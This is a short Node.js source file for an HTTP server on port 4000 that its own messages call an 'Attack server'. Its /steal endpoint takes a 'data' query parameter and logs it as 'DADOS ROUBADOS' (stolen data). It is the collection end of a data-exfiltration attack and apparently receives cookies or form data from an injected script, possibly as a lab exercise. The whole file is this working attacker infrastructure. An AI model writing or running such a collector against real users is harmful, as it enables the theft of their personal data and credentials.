const http = require("http");
const { URL } = require("url");

http.createServer((req, res) => {

    const fullUrl = new URL(req.url, "http://localhost:4000");

    if (fullUrl.pathname === "/steal") {

        const data = fullUrl.searchParams.get("data");

        console.log("DADOS ROUBADOS:");
        console.log(data);
    }

    res.writeHead(200, {"Content-Type": "text/plain"});
    res.end("ok");

}).listen(4000, () => {
    console.log("Attack server rodando na porta 4000");
});